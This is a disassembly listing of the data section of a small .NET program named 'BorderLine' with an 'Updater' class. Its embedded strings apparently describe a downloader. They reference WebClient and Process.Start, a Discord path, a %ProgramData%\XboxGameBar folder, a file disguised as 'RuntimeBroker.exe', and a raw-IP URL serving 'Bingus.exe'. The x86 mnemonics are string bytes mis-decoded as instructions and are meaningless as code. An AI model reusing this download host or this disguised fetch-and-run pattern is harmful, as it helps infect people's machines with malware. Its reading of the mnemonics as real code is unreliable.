  402601:	6f                   	outsl  %ds:(%esi),(%dx)
  402602:	67 72 61             	addr16 jb 0x402666
  402605:	6d                   	insl   (%dx),%es:(%edi)
  402606:	00 53 79             	add    %dl,0x79(%ebx)
  402609:	73 74                	jae    0x40267f
  40260b:	65 6d                	gs insl (%dx),%es:(%edi)
  40260d:	00 4d 61             	add    %cl,0x61(%ebp)
  402610:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402617:	65 6d                	gs insl (%dx),%es:(%edi)
  402619:	2e 52                	cs push %edx
  40261b:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40261e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402623:	6e                   	outsb  %ds:(%esi),(%dx)
  402624:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  402628:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40262d:	79 49                	jns    0x402678
  40262f:	6e                   	outsb  %ds:(%esi),(%dx)
  402630:	66 6f                	outsw  %ds:(%esi),(%dx)
  402632:	00 53 70             	add    %dl,0x70(%ebx)
  402635:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  402639:	6c                   	insb   (%dx),%es:(%edi)
  40263a:	46                   	inc    %esi
  40263b:	6f                   	outsl  %ds:(%esi),(%dx)
  40263c:	6c                   	insb   (%dx),%es:(%edi)
  40263d:	64 65 72 00          	fs gs jb 0x402641
  402641:	55                   	push   %ebp
  402642:	70 64                	jo     0x4026a8
  402644:	61                   	popa
  402645:	74 65                	je     0x4026ac
  402647:	72 00                	jb     0x402649
  402649:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40264e:	00 2e                	add    %ch,(%esi)
  402650:	63 63 74             	arpl   %esp,0x74(%ebx)
  402653:	6f                   	outsl  %ds:(%esi),(%dx)
  402654:	72 00                	jb     0x402656
  402656:	53                   	push   %ebx
  402657:	79 73                	jns    0x4026cc
  402659:	74 65                	je     0x4026c0
  40265b:	6d                   	insl   (%dx),%es:(%edi)
  40265c:	2e 44                	cs inc %esp
  40265e:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402665:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40266c:	74 65                	je     0x4026d3
  40266e:	6d                   	insl   (%dx),%es:(%edi)
  40266f:	2e 52                	cs push %edx
  402671:	75 6e                	jne    0x4026e1
  402673:	74 69                	je     0x4026de
  402675:	6d                   	insl   (%dx),%es:(%edi)
  402676:	65 2e 49             	gs cs dec %ecx
  402679:	6e                   	outsb  %ds:(%esi),(%dx)
  40267a:	74 65                	je     0x4026e1
  40267c:	72 6f                	jb     0x4026ed
  40267e:	70 53                	jo     0x4026d3
  402680:	65 72 76             	gs jb  0x4026f9
  402683:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40268a:	73 74                	jae    0x402700
  40268c:	65 6d                	gs insl (%dx),%es:(%edi)
  40268e:	2e 52                	cs push %edx
  402690:	75 6e                	jne    0x402700
  402692:	74 69                	je     0x4026fd
  402694:	6d                   	insl   (%dx),%es:(%edi)
  402695:	65 2e 43             	gs cs inc %ebx
  402698:	6f                   	outsl  %ds:(%esi),(%dx)
  402699:	6d                   	insl   (%dx),%es:(%edi)
  40269a:	70 69                	jo     0x402705
  40269c:	6c                   	insb   (%dx),%es:(%edi)
  40269d:	65 72 53             	gs jb  0x4026f3
  4026a0:	65 72 76             	gs jb  0x402719
  4026a3:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4026aa:	62 75 67             	bound  %esi,0x67(%ebp)
  4026ad:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4026b4:	65 
  4026b5:	73 00                	jae    0x4026b7
  4026b7:	45                   	inc    %ebp
  4026b8:	78 70                	js     0x40272a
  4026ba:	61                   	popa
  4026bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4026bc:	64 45                	fs inc %ebp
  4026be:	6e                   	outsb  %ds:(%esi),(%dx)
  4026bf:	76 69                	jbe    0x40272a
  4026c1:	72 6f                	jb     0x402732
  4026c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4026c4:	6d                   	insl   (%dx),%es:(%edi)
  4026c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4026c7:	74 56                	je     0x40271f
  4026c9:	61                   	popa
  4026ca:	72 69                	jb     0x402735
  4026cc:	61                   	popa
  4026cd:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4026d1:	00 50 61             	add    %dl,0x61(%eax)
  4026d4:	74 68                	je     0x40273e
  4026d6:	73 00                	jae    0x4026d8
  4026d8:	50                   	push   %eax
  4026d9:	72 6f                	jb     0x40274a
  4026db:	63 65 73             	arpl   %esp,0x73(%ebp)
  4026de:	73 00                	jae    0x4026e0
  4026e0:	45                   	inc    %ebp
  4026e1:	78 69                	js     0x40274c
  4026e3:	73 74                	jae    0x402759
  4026e5:	73 00                	jae    0x4026e7
  4026e7:	43                   	inc    %ebx
  4026e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4026ea:	63 61 74             	arpl   %esp,0x74(%ecx)
  4026ed:	00 4f 62             	add    %cl,0x62(%edi)
  4026f0:	6a 65                	push   $0x65
  4026f2:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4026f6:	79 73                	jns    0x40276b
  4026f8:	74 65                	je     0x40275f
  4026fa:	6d                   	insl   (%dx),%es:(%edi)
  4026fb:	2e 4e                	cs dec %esi
  4026fd:	65 74 00             	gs je  0x402700
  402700:	45                   	inc    %ebp
  402701:	78 69                	js     0x40276c
  402703:	74 00                	je     0x402705
  402705:	57                   	push   %edi
  402706:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40270a:	69 65 6e 74 00 45 6e 	imul   $0x6e450074,0x6e(%ebp),%esp
  402711:	76 69                	jbe    0x40277c
  402713:	72 6f                	jb     0x402784
  402715:	6e                   	outsb  %ds:(%esi),(%dx)
  402716:	6d                   	insl   (%dx),%es:(%edi)
  402717:	65 6e                	outsb  %gs:(%esi),(%dx)
  402719:	74 00                	je     0x40271b
  40271b:	53                   	push   %ebx
  40271c:	74 61                	je     0x40277f
  40271e:	72 74                	jb     0x402794
  402720:	00 43 72             	add    %al,0x72(%ebx)
  402723:	65 61                	gs popa
  402725:	74 65                	je     0x40278c
  402727:	44                   	inc    %esp
  402728:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40272f:	79 00                	jns    0x402731
  402731:	00 00                	add    %al,(%eax)
  402733:	00 00                	add    %al,(%eax)
  402735:	11 5c 00 44          	adc    %ebx,0x44(%eax,%eax,1)
  402739:	00 69 00             	add    %ch,0x0(%ecx)
  40273c:	73 00                	jae    0x40273e
  40273e:	63 00                	arpl   %eax,(%eax)
  402740:	6f                   	outsl  %ds:(%esi),(%dx)
  402741:	00 72 00             	add    %dh,0x0(%edx)
  402744:	64 00 00             	add    %al,%fs:(%eax)
  402747:	1b 25 00 50 00 72    	sbb    0x72005000,%esp
  40274d:	00 6f 00             	add    %ch,0x0(%edi)
  402750:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  402754:	61                   	popa
  402755:	00 6d 00             	add    %ch,0x0(%ebp)
  402758:	44                   	inc    %esp
  402759:	00 61 00             	add    %ah,0x0(%ecx)
  40275c:	74 00                	je     0x40275e
  40275e:	61                   	popa
  40275f:	00 25 00 00 1b 5c    	add    %ah,0x5c1b0000
  402765:	00 58 00             	add    %bl,0x0(%eax)
  402768:	62 00                	bound  %eax,(%eax)
  40276a:	6f                   	outsl  %ds:(%esi),(%dx)
  40276b:	00 78 00             	add    %bh,0x0(%eax)
  40276e:	47                   	inc    %edi
  40276f:	00 61 00             	add    %ah,0x0(%ecx)
  402772:	6d                   	insl   (%dx),%es:(%edi)
  402773:	00 65 00             	add    %ah,0x0(%ebp)
  402776:	42                   	inc    %edx
  402777:	00 61 00             	add    %ah,0x0(%ecx)
  40277a:	72 00                	jb     0x40277c
  40277c:	5c                   	pop    %esp
  40277d:	00 00                	add    %al,(%eax)
  40277f:	23 52 00             	and    0x0(%edx),%edx
  402782:	75 00                	jne    0x402784
  402784:	6e                   	outsb  %ds:(%esi),(%dx)
  402785:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  402789:	00 6d 00             	add    %ch,0x0(%ebp)
  40278c:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  402790:	72 00                	jb     0x402792
  402792:	6f                   	outsl  %ds:(%esi),(%dx)
  402793:	00 6b 00             	add    %ch,0x0(%ebx)
  402796:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40279a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40279e:	78 00                	js     0x4027a0
  4027a0:	65 00 00             	add    %al,%gs:(%eax)
  4027a3:	4d                   	dec    %ebp
  4027a4:	68 00 74 00 74       	push   $0x74007400
  4027a9:	00 70 00             	add    %dh,0x0(%eax)
  4027ac:	3a 00                	cmp    (%eax),%al
  4027ae:	2f                   	das
  4027af:	00 2f                	add    %ch,(%edi)
  4027b1:	00 36                	add    %dh,(%esi)
  4027b3:	00 32                	add    %dh,(%edx)
  4027b5:	00 2e                	add    %ch,(%esi)
  4027b7:	00 31                	add    %dh,(%ecx)
  4027b9:	00 38                	add    %bh,(%eax)
  4027bb:	00 32                	add    %dh,(%edx)
  4027bd:	00 2e                	add    %ch,(%esi)
  4027bf:	00 38                	add    %bh,(%eax)
  4027c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027c4:	2e 00 36             	add    %dh,%cs:(%esi)
  4027c7:	00 31                	add    %dh,(%ecx)
  4027c9:	00 2f                	add    %ch,(%edi)
  4027cb:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027ce:	35 00 36 00 33       	xor    $0x33003600,%eax
  4027d3:	00 36                	add    %dh,(%esi)
  4027d5:	00 33                	add    %dh,(%ebx)
  4027d7:	00 36                	add    %dh,(%esi)
  4027d9:	00 2f                	add    %ch,(%edi)
  4027db:	00 42 00             	add    %al,0x0(%edx)
  4027de:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4027e4:	75 00                	jne    0x4027e6
  4027e6:	73 00                	jae    0x4027e8
  4027e8:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4027ec:	78 00                	js     0x4027ee
  4027ee:	65 00 00             	add    %al,%gs:(%eax)
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	00 6a 3c             	add    %ch,0x3c(%edx)
  4027f6:	19 db                	sbb    %ebx,%ebx
  4027f8:	4f                   	dec    %edi
  4027f9:	f5                   	cmc
  4027fa:	c9                   	leave
  4027fb:	44                   	inc    %esp
  4027fc:	89 81 6b 81 e5 39    	mov    %eax,0x39e5816b(%ecx)
  402802:	1a d4                	sbb    %ah,%dl
  402804:	00 04 20             	add    %al,(%eax,%eiz,1)
  402807:	01 01                	add    %eax,(%ecx)
  402809:	08 03                	or     %al,(%ebx)
  40280b:	20 00                	and    %al,(%eax)
  40280d:	01 05 20 01 01 11    	add    %eax,0x11010120
  402813:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  402816:	01 01                	add    %eax,(%ecx)
  402818:	0e                   	push   %cs
  402819:	04 20                	add    $0x20,%al
  40281b:	01 01                	add    %eax,(%ecx)
  40281d:	02 05 00 01 0e 11    	add    0x110e0100,%al
  402823:	51                   	push   %ecx
  402824:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402829:	0e                   	push   %cs
  40282a:	04 00                	add    $0x0,%al
  40282c:	01 0e                	add    %ecx,(%esi)
  40282e:	0e                   	push   %cs
  40282f:	07                   	pop    %es
  402830:	07                   	pop    %es
  402831:	04 02                	add    $0x2,%al
  402833:	02 12                	add    (%edx),%dl
  402835:	49                   	dec    %ecx
  402836:	02 04 00             	add    (%eax,%eax,1),%al
  402839:	01 02                	add    %eax,(%edx)
  40283b:	0e                   	push   %cs
  40283c:	04 00                	add    $0x0,%al
  40283e:	01 01                	add    %eax,(%ecx)
  402840:	08 05 00 01 12 61    	or     %al,0x61120100
  402846:	0e                   	push   %cs
  402847:	05 00 01 12 65       	add    $0x65120100,%eax
  40284c:	0e                   	push   %cs
  40284d:	05 20 02 01 0e       	add    $0xe010220,%eax
  402852:	0e                   	push   %cs
  402853:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  402859:	34 e0                	xor    $0xe0,%al
  40285b:	89 02                	mov    %eax,(%edx)
  40285d:	06                   	push   %es
  40285e:	0e                   	push   %cs
  40285f:	03 00                	add    (%eax),%eax
  402861:	00 01                	add    %al,(%ecx)
  402863:	08 01                	or     %al,(%ecx)
  402865:	00 08                	add    %cl,(%eax)
  402867:	00 00                	add    %al,(%eax)
  402869:	00 00                	add    %al,(%eax)
  40286b:	00 1e                	add    %bl,(%esi)
  40286d:	01 00                	add    %eax,(%eax)
  40286f:	01 00                	add    %eax,(%eax)
  402871:	54                   	push   %esp
  402872:	02 16                	add    (%esi),%dl
  402874:	57                   	push   %edi
  402875:	72 61                	jb     0x4028d8
  402877:	70 4e                	jo     0x4028c7
  402879:	6f                   	outsl  %ds:(%esi),(%dx)
  40287a:	6e                   	outsb  %ds:(%esi),(%dx)
  40287b:	45                   	inc    %ebp
  40287c:	78 63                	js     0x4028e1
  40287e:	65 70 74             	gs jo  0x4028f5
  402881:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402888:	77 73                	ja     0x4028fd
  40288a:	01 08                	add    %ecx,(%eax)
  40288c:	01 00                	add    %eax,(%eax)
  40288e:	07                   	pop    %es
  40288f:	01 00                	add    %eax,(%eax)
  402891:	00 00                	add    %al,(%eax)
  402893:	00 0f                	add    %cl,(%edi)
  402895:	01 00                	add    %eax,(%eax)
  402897:	0a 42 6f             	or     0x6f(%edx),%al
  40289a:	72 64                	jb     0x402900
  40289c:	65 72 4c             	gs jb  0x4028eb
  40289f:	69 6e 65 00 00 05 01 	imul   $0x1050000,0x65(%esi),%ebp
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	0f 01 00             	sgdtl  (%eax)
  4028ad:	0a 37                	or     (%edi),%dh
  4028af:	33 33                	xor    (%ebx),%esi
  4028b1:	37                   	aaa
  4028b2:	2d 31 37 33 35       	sub    $0x35333731,%eax
  4028b7:	32 00                	xor    (%eax),%al
  4028b9:	00 21                	add    %ah,(%ecx)
  4028bb:	01 00                	add    %eax,(%eax)
  4028bd:	1c 43                	sbb    $0x43,%al
  4028bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4028c0:	70 79                	jo     0x40293b
  4028c2:	72 69                	jb     0x40292d
  4028c4:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4028ca:	20 37                	and    %dh,(%edi)
  4028cc:	33 33                	xor    (%ebx),%esi
  4028ce:	37                   	aaa
  4028cf:	2d 31 37 33 35       	sub    $0x35333731,%eax
  4028d4:	32 20                	xor    (%eax),%ah
  4028d6:	32 30                	xor    (%eax),%dh
  4028d8:	32 33                	xor    (%ebx),%dh
  4028da:	00 00                	add    %al,(%eax)
  4028dc:	29 01                	sub    %eax,(%ecx)
  4028de:	00 24 65 38 38 34 32 	add    %ah,0x32343838(,%eiz,2)
  4028e5:	35 62 35 2d 61       	xor    $0x612d3562,%eax
  4028ea:	65 37                	gs aaa
  4028ec:	64 2d 34 35 62 39    	fs sub $0x39623534,%eax
  4028f2:	2d 39 33 62 35       	sub    $0x35623339,%eax
  4028f7:	2d 66 30 61 36       	sub    $0x36613066,%eax
  4028fc:	65 33 65 36          	xor    %gs:0x36(%ebp),%esp
  402900:	62 34 37             	bound  %esi,(%edi,%esi,1)
  402903:	33 00                	xor    (%eax),%eax
  402905:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402908:	00 07                	add    %al,(%edi)
  40290a:	31 2e                	xor    %ebp,(%esi)
  40290c:	30 2e                	xor    %ch,(%esi)
  40290e:	30 2e                	xor    %ch,(%esi)
  402910:	30 00                	xor    %al,(%eax)
  402912:	00 49 01             	add    %cl,0x1(%ecx)
  402915:	00 1a                	add    %bl,(%edx)
  402917:	2e 4e                	cs dec %esi
  402919:	45                   	inc    %ebp
  40291a:	54                   	push   %esp
  40291b:	46                   	inc    %esi
  40291c:	72 61                	jb     0x40297f
  40291e:	6d                   	insl   (%dx),%es:(%edi)
  40291f:	65 77 6f             	gs ja  0x402991
  402922:	72 6b                	jb     0x40298f
  402924:	2c 56                	sub    $0x56,%al
  402926:	65 72 73             	gs jb  0x40299c
  402929:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  402930:	38 01                	cmp    %al,(%ecx)
  402932:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  402936:	46                   	inc    %esi
  402937:	72 61                	jb     0x40299a
  402939:	6d                   	insl   (%dx),%es:(%edi)
  40293a:	65 77 6f             	gs ja  0x4029ac
  40293d:	72 6b                	jb     0x4029aa
  40293f:	44                   	inc    %esp
  402940:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  402947:	61                   	popa
  402948:	6d                   	insl   (%dx),%es:(%edi)
  402949:	65 12 2e             	adc    %gs:(%esi),%ch
  40294c:	4e                   	dec    %esi
  40294d:	45                   	inc    %ebp
  40294e:	54                   	push   %esp
  40294f:	20 46 72             	and    %al,0x72(%esi)
  402952:	61                   	popa
  402953:	6d                   	insl   (%dx),%es:(%edi)
  402954:	65 77 6f             	gs ja  0x4029c6
  402957:	72 6b                	jb     0x4029c4
  402959:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40295c:	38 00                	cmp    %al,(%eax)
  40295e:	00 00                	add    %al,(%eax)
  402960:	00 00                	add    %al,(%eax)
  402962:	00 00                	add    %al,(%eax)
  402964:	23 17                	and    (%edi),%edx
  402966:	64 cf                	fs iret
  402968:	00 00                	add    %al,(%eax)
  40296a:	00 00                	add    %al,(%eax)
  40296c:	02 00                	add    (%eax),%al
  40296e:	00 00                	add    %al,(%eax)
  402970:	60                   	pusha
  402971:	00 00                	add    %al,(%eax)
  402973:	00 98 29 00 00 98    	add    %bl,-0x67ffffd7(%eax)
  402979:	0b 00                	or     (%eax),%eax
	...
  402987:	00 10                	add    %dl,(%eax)
	...
  402995:	00 00                	add    %al,(%eax)
  402997:	00 52 53             	add    %dl,0x53(%edx)
  40299a:	44                   	inc    %esp
  40299b:	53                   	push   %ebx
  40299c:	b6 a5                	mov    $0xa5,%dh
  40299e:	27                   	daa
  40299f:	ad                   	lods   %ds:(%esi),%eax
  4029a0:	68 d0 22 4b 99       	push   $0x994b22d0
  4029a5:	94                   	xchg   %eax,%esp
  4029a6:	b6 29                	mov    $0x29,%dh
  4029a8:	52                   	push   %edx
  4029a9:	87 d0                	xchg   %edx,%eax
  4029ab:	7d 01                	jge    0x4029ae
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	00 43 3a             	add    %al,0x3a(%ebx)
  4029b2:	5c                   	pop    %esp
  4029b3:	55                   	push   %ebp
  4029b4:	73 65                	jae    0x402a1b
  4029b6:	72 73                	jb     0x402a2b
  4029b8:	5c                   	pop    %esp
  4029b9:	55                   	push   %ebp
  4029ba:	73 65                	jae    0x402a21
  4029bc:	72 27                	jb     0x4029e5
  4029be:	5c                   	pop    %esp
  4029bf:	73 6f                	jae    0x402a30
  4029c1:	75 72                	jne    0x402a35
  4029c3:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  4029c6:	72 65                	jb     0x402a2d
  4029c8:	70 6f                	jo     0x402a39
  4029ca:	73 5c                	jae    0x402a28
  4029cc:	42                   	inc    %edx
  4029cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ce:	72 64                	jb     0x402a34
  4029d0:	65 72 4c             	gs jb  0x402a1f
  4029d3:	69 6e 65 5c 42 6f 72 	imul   $0x726f425c,0x65(%esi),%ebp
  4029da:	64 65 72 4c          	fs gs jb 0x402a2a
  4029de:	69 6e 65 5c 6f 62 6a 	imul   $0x6a626f5c,0x65(%esi),%ebp
  4029e5:	5c                   	pop    %esp
  4029e6:	44                   	inc    %esp
  4029e7:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4029eb:	5c                   	pop    %esp
  4029ec:	55                   	push   %ebp
  4029ed:	70 64                	jo     0x402a53
  4029ef:	61                   	popa
  4029f0:	74 65                	je     0x402a57
  4029f2:	72 2e                	jb     0x402a22
  4029f4:	70 64                	jo     0x402a5a
  4029f6:	62 00                	bound  %eax,(%eax)
  4029f8:	20 2a                	and    %ch,(%edx)
	...
  402a02:	00 00                	add    %al,(%eax)
  402a04:	3a 2a                	cmp    (%edx),%ch
  402a06:	00 00                	add    %al,(%eax)
  402a08:	00 20                	add    %ah,(%eax)
	...
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	2c 2a                	sub    $0x2a,%al
	...
  402a2e:	5f                   	pop    %edi
  402a2f:	43                   	inc    %ebx
  402a30:	6f                   	outsl  %ds:(%esi),(%dx)
  402a31:	72 45                	jb     0x402a78
  402a33:	78 65                	js     0x402a9a
  402a35:	4d                   	dec    %ebp
  402a36:	61                   	popa
  402a37:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402a3e:	72 65                	jb     0x402aa5
  402a40:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402a44:	6c                   	insb   (%dx),%es:(%edi)
  402a45:	00 00                	add    %al,(%eax)
  402a47:	00 00                	add    %al,(%eax)
  402a49:	00 ff                	add    %bh,%bh
  402a4b:	25 00 20 40 00       	and    $0x402000,%eax
